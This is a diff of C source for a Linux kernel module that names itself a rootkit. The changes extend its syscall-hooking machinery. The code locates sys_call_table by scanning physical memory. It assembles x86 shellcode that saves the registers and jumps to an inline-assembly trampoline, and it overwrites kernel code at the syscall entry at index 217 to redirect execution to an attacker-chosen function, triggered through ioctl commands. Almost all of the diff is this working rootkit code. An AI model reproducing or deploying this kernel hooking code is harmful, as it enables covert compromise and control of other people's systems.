@@ -51,13 +51,17 @@ static void sys_call_table_finder(void){
         "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
         NULL,
     };
+    if(get_syscall_data){
+    //    printk(KERN_INFO "[peiwithhao rootkit] already have the sys_call_table at 0x%lx", syscall_table_addr);
+        return;
+    }
 
     /* 调用用户态程序 */
     /* UMH_WAIT_PROC这个标识符表示要等用户程序执行完毕 */
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
-    if(!get_syscall_data){
-        panic("failed to get the sycall data from userspace!");
-    }
+    // if(!get_syscall_data){
+    //     panic("failed to get the sycall data from userspace!");
+    // }
     for(size_t i = 0;; i++){
         if(phys_mem[i+0] == syscall_table_data[0]
         && phys_mem[i+1] == syscall_table_data[1]
@@ -72,21 +76,60 @@ static void sys_call_table_finder(void){
     get_syscall_data = 1;
 }
 
-static void funny_joke(size_t hook_addr, void *orig_code, size_t count){
+static void funny_joke(void){
     printk("[peiwithhao rootkit] You are hooked by THE GREAT PEIWITHHAO ;)");
-    arbitrary_remap_write((void *)(hook_addr), orig_code, count);
+}
+
+
+
+//void (*evil_func)(void);
+
     /*
+    void (*evil_func) (void)  = (void (*)(void))hooker_addr;
+
+    evil_func();
+
+    arbitrary_remap_write((void *)(hooked_addr), orig_code, count);
+    */
+
+static void hook_king(size_t hooked_addr, void *orig_code, size_t count, size_t hooker_addr){
     asm volatile(
-        "movq %%rbp, %%rsp;"
+        "subq $0x58, %%rsp;"
+        "movq %0, %%rdi;"
+        "movq %0, %%r15;"
+        "movq %1, %%rsi;"
+        "movq %2, %%rdx;"
+        "movq %3, %%rcx;"
+        "push %%rcx;"
+        "call *%4;"
+        "pop %%rcx;"
+        "call *%%rcx;"
+        "addq $0x58, %%rsp;"
+        "pop %%rsp;"
         "pop %%rbp;"
-        "movq %0, %%rax;"
-        "jmp %%rax;" : :"r"(hook_addr): "%rax");
-        */
+        "pop %%r14;"        //原本是r15
+        "pop %%r14;"
+        "pop %%r13;"
+        "pop %%r12;"
+        "pop %%r11;"
+        "pop %%r10;"
+        "pop %%r9;"
+        "pop %%r8;"
+        "pop %%rdi;"
+        "pop %%rsi;"
+        "pop %%rdx;"
+        "pop %%rcx;"
+        "pop %%rbx;"
+        "pop %%rax;"
+        "call *%%r15;" 
+        :
+        : "r"(hooked_addr), "r"(orig_code), "r"(count), "r"(hooker_addr), "r"((size_t)arbitrary_remap_write)
+        : "%rdi", "%rsi", "%rdx", "%rdx");
 }
 
 
 static ssize_t pwh_rootkit_read(struct file *file, char __user *buf, size_t count, loff_t * ppos){
-    arbitrary_remap_write((void *)(syscall_table_addr), "peiwithhao", 10);
+    //arbitrary_remap_write((void *)(syscall_table_addr), "peiwithhao", 10);
     return 0;
 }
 
@@ -98,14 +141,23 @@ static ssize_t super_hooker(size_t hook_addr, size_t evil_func){
     size_t index;
     size_t *share_orig;
     u8 *shellcode;
+    size_t hook_ctl;
+    u8 store_regs[] = {0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x55, 0x54 };
+    hook_ctl = (size_t)hook_king;
+    //push regs
+    shellcode_nr = sizeof(store_regs);
     // mov rdi, *       0x48 0xbf
-    shellcode_nr = sizeof(u8) + sizeof(u8);
+    shellcode_nr += sizeof(u8) + sizeof(u8);
     shellcode_nr += sizeof(size_t);
     // mov rsi, *       0x48 0xbe
     shellcode_nr += sizeof(u8) + sizeof(u8);
     shellcode_nr += sizeof(size_t);
 
     // mov rdx, *       0x48 0xba
+    shellcode_nr += sizeof(u8) + sizeof(u8);
+    shellcode_nr += sizeof(size_t);
+
+    // mov rcx, *       0x48 0xc7 0xc1
     shellcode_nr += sizeof(u8) + sizeof(u8);
     shellcode_nr += sizeof(size_t);
 
@@ -127,7 +179,12 @@ static ssize_t super_hooker(size_t hook_addr, size_t evil_func){
     
     index = 0;
 
-    /* mov rdi, orig_code */
+    /* 保存现场 */
+    for(int i = 0; i < sizeof(store_regs) ; i++){
+        shellcode[index++] = store_regs[i];
+    }
+
+    /* mov rdi, hook_addr */
     shellcode[index++] = 0x48;
     shellcode[index++] = 0xBF;
     for(int i = 0; i < sizeof(size_t) ; i++){
@@ -143,7 +200,7 @@ static ssize_t super_hooker(size_t hook_addr, size_t evil_func){
         shellcode[index++] = ((char *)(&share_orig))[i];
     }
 
-    /* mov rsi, orig_code */
+    /* mov rdx, shellcode_nr */
     shellcode[index++] = 0x48;
     shellcode[index++] = 0xBA;
     for(int i = 0; i < sizeof(size_t) ; i++){
@@ -151,17 +208,24 @@ static ssize_t super_hooker(size_t hook_addr, size_t evil_func){
         shellcode[index++] = ((char *)&shellcode_nr)[i];
     }
 
+    /* mov rcx, evil_func */
+    shellcode[index++] = 0x48;
+    shellcode[index++] = 0xB9;
+    for(int i = 0; i < sizeof(size_t) ; i++){
+        //写入orig_code的地址
+        shellcode[index++] = ((char *)&evil_func)[i];
+    }
+
     /* mov rax, shellcode */
     shellcode[index++] = 0x48;
     shellcode[index++] = 0xB8;
     for(int i = 0; i < sizeof(size_t) ; i++){
-        shellcode[index++] = ((char *)&evil_func)[i];
+        shellcode[index++] = ((char *)&hook_ctl)[i];
     }
     /* jmp rax */
     shellcode[index++] = 0xFF;
     shellcode[index++] = 0xE0;
 
-    printk(KERN_INFO "HOOKING...");
 
     arbitrary_remap_write((void *)hook_addr, shellcode, shellcode_nr);
 
@@ -169,44 +233,35 @@ static ssize_t super_hooker(size_t hook_addr, size_t evil_func){
     return 0;
 }
 
-
-
-
-
 static ssize_t pwh_rootkit_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
     //void *hook_ptr = funny_joke;
-    size_t poll_addr;
-
-    /* 寻找系统调用表 */
-    sys_call_table_finder();
+    // size_t poll_addr;
+    //
+    // /* 寻找系统调用表 */
+    // sys_call_table_finder();
     printk(KERN_INFO "sys_read_addr: 0x%lx", ((size_t *)syscall_table_addr)[7]);
-    poll_addr = ((size_t *)syscall_table_addr)[217];
-    super_hooker(poll_addr, (size_t)&funny_joke);
+    // poll_addr = ((size_t *)syscall_table_addr)[217];
+    // super_hooker(poll_addr, (size_t)&funny_joke);
     //arbitrary_remap_write((void *)poll_addr, shellcode, sizeof(shellcode));
     return 0;
 }
 
 static long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
-    size_t poll_addr;
+    size_t hooked_addr;
     int ret;
     switch(cmd){
         case USER_KALLSYMS:
             ret = copy_from_user(syscall_table_data, (void *)arg, sizeof(syscall_table_data));
             break;
         case SEARCH_SYSCALL:
-            if(!get_syscall_data){
                 /* 寻找系统调用表 */
-                sys_call_table_finder();
-            }
+            sys_call_table_finder();
             break;
         case SUPER_HOOK:
-            if(!get_syscall_data){
                 /* 寻找系统调用表 */
-                sys_call_table_finder();
-            }
-            //printk(KERN_INFO "sys_read_addr: 0x%lx", ((size_t *)syscall_table_addr)[7]);
-            poll_addr = ((size_t *)syscall_table_addr)[217];
-            super_hooker(poll_addr, (size_t)&funny_joke);
+            sys_call_table_finder();
+            hooked_addr = ((size_t *)syscall_table_addr)[217];
+            super_hooker(hooked_addr, (size_t)&funny_joke);
             //arbitrary_remap_write((void *)poll_addr, shellcode, sizeof(shellcode));
             break;
         default:
